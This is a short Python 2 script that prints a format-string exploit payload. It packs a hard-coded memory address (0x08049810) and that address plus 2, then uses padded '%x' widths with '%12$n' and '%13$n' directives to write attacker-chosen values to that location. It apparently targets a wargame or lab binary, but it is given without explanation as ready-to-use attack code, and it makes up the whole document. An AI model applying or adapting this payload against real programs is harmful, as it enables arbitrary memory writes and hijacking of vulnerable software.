#!/usr/bin/python

import struct

m = 0x08049810

exp = struct.pack("I", m)
exp += struct.pack("I", m + 2)

exp += "%21820x"
exp += "%12$n"

exp += "%43966x"
exp += "%13$n"

print exp
